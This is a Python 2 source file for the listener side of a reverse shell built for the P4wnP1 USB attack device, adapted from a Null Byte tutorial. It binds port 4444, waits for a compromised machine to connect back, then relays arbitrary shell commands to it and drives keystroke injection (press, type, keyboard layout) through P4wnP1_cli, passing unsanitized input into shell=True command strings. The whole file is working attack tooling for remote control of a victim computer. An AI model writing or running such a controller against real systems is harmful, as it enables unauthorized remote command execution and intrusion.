# nullbyte python server reverse shell
# source : https://null-byte.wonderhowto.com/how-to/reverse-shell-using-python-0163875/
# Modify by BeBoX 22.01.2019 auto add shell in cmd, corrected some errors
# Set in FR language
import socket, os, sys, time, subprocess
def shell(cmd):
    return(subprocess.check_output(cmd, shell = True ))
def socketCreate():
    try:
        global host
        global port
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = ''
        port = 4444
    except socket.error as msg:
        print('socket creation error:  ' + str(msg[0]))
def socketBind():
    try:
        print('Binding socket at port %s'%(port))
        s.bind((host,port))
        s.listen(1)
    except socket.error as msg:
        print('socket binding error: ' + str(msg[0]))
        print('Retring...')
        time.sleep(500)
        socketBind()
def socketAccept():
    global conn
    global addr
    global hostname
    try:
        conn, addr = s.accept()
        print('[!] Session opened at %s:%s'%(addr[0],addr[1]))
        print('**** Welcome to P4wnP1 ReverseShell by BeBoX ****')
        print('Command list :')
        print('layout : set keyboard layout ex.layout fr')
        print('speed : typing speed slow or fast ex.speed fast')
        print('press : Send key stoke ex.press GUI r')
        print('type  : type somthing on keyboard ex. type hello')
        print('-help : this text')
        print('quit  : leave and quit reverse shell')
        hostname = conn.recv(1024)
        menu()
    except socket.error as msg:
        print('Socket Accepting error: ' + str(msg[0]))
def menu():
    shell("P4wnP1_cli hid run -c \"press('GUI DOWN')\"")
    result = ""
    while 1:
        cmd = raw_input(str(addr[0])+'@'+ str(hostname) + '> ')
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        elif cmd == 'exit':
            conn.close()
            s.close()
            sys.exit()
        elif cmd == '-help':
            print('Command list :')
            print('layout : set keyboard layout ex.layout fr')
            print('speed : typing speed slow or fast ex.speed fast')
            print('press : Send key stoke ex.press GUI r')
            print('type  : type somthing on keyboard ex. type hello')
            print('-help : this text')
            print('quit  : leave and quit reverse shell')
            result = ''
        elif cmd[:6] == 'layout':
            shell("P4wnP1_cli hid run -c \"layout('%s')\""%(cmd[7:]))
            result = "Set P4wnP1 layout to :" + cmd[7:]
        elif cmd[:5] == 'speed':
            if cmd[6:] == 'fast':
                shell("P4wnP1_cli hid run -c \"typingSpeed(0,0)\"")
                result = "Set P4wnP1 typing speed to :" + cmd[6:]
            elif cmd[6:] == 'slow':
                shell("P4wnP1_cli hid run -c \"typingSpeed(100,150)\"")
                result = "Set P4wnP1 typing speed to :" + cmd[6:]
            else:
                result = "Unknown speed parameter, try fast or slow"
        elif cmd[:5] == 'press':
            shell("P4wnP1_cli hid run -c \"press('%s')\""%(cmd[6:]))
            result = "Send %s to keyboard"%(cmd[6:])
        elif cmd[:4] == 'type':
            shell("P4wnP1_cli hid run -c \"type('%s')\""%(cmd[5:]))
            result = "Sent to keyboard"
        else:
            cmd = 'shell '+ cmd #add automaticaly shell before commands if not quit
            command = conn.send(cmd)
            result = conn.recv(16834)
        if result <> hostname:
            print(result)
def main():
    socketCreate()
    socketBind()
    socketAccept()
    
main()